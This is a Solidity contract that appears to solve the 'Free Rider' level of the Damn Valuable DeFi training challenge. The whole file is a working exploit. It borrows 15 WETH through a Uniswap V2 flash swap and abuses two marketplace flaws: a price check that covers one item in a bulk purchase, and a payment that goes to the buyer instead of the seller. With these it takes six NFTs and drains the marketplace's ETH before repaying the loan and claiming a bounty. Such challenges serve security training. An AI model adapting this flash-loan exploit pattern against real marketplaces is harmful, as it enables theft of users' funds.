// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FreeRiderRecovery.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableToken.sol";
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";
import "solmate/src/tokens/WETH.sol";

contract AttackFreeRider {
    address payable public immutable attacker;
    DamnValuableToken public immutable dvt;
    WETH public immutable weth;
    DamnValuableNFT public immutable nft;
    IUniswapV2Pair public immutable pair;
    IUniswapV2Factory public immutable factory;
    FreeRiderNFTMarketplace public immutable marketplace;
    FreeRiderRecovery public immutable recovery;
    uint256 public constant wethLoanAmount = 15 ether;
    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        DamnValuableToken _dvt,
        DamnValuableNFT _nft,
        WETH _weth,
        IUniswapV2Factory _factory,
        IUniswapV2Pair _pair,
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecovery _recovery
    ) payable {
        attacker = payable(msg.sender);
        dvt = _dvt;
        weth = _weth;
        nft = _nft;
        pair = _pair;
        factory = _factory;
        marketplace = _marketplace;
        recovery = _recovery;
    }

    function attack() external payable {
        // Get the extra eth and pays for the NFTs
        _flashSwap();
        // Transfers the NFTs to recovery contract and claims the bounty
        _claimBounty();
    }

    function _claimBounty() internal {
        // Transfer NFTs to recovery and claim bounty
        for (uint8 i = 0; i < 6; i++) {
            nft.safeTransferFrom(
                address(this),
                address(recovery),
                i,
                abi.encode(attacker)
            );
        }
    }

    function _flashSwap() internal {
        // Make a flash swap from UniswapV2Pair
        // We need 15 eth to transfer all NFT because of contract vulnerability
        // That only asks the msg.value to be greater than the price to pay
        // Even if you want to buy multiple nfts.
        bytes memory data = abi.encode(wethLoanAmount);
        pair.swap(
            wethLoanAmount, // Amount of WETH we get
            0, // Amount of DVT we get
            address(this), // receiver
            data
        );
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        // This is the callback function that will be executed from Uniswap

        // Withdraw 15WETH to ETH because marketplace receives ETH.
        weth.withdraw(wethLoanAmount);

        // Purchase all NFTS for the price of 1 (15 ETH)
        // This will also give us 90 extra ETH
        // Because of second vulnerability that transfers first the NFT
        // Then pays the amount using token owner
        // In a nutshell, it pays the buyer the ETH back for buying the NFT to seller xD
        marketplace.buyMany{value: wethLoanAmount}(tokenIds);

        // Calculate loan repayment
        uint256 fee = ((wethLoanAmount * 3) / 997) + 1;
        uint256 amountToRepay = wethLoanAmount + fee;
        // Deposit needed ETH to WETH so we can pay back the loan
        weth.deposit{value: amountToRepay}();

        // Pay back the loan + fee to pair
        weth.transfer(address(pair), amountToRepay);
    }

    // Interface required to receive NFT as a Smart Contract
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
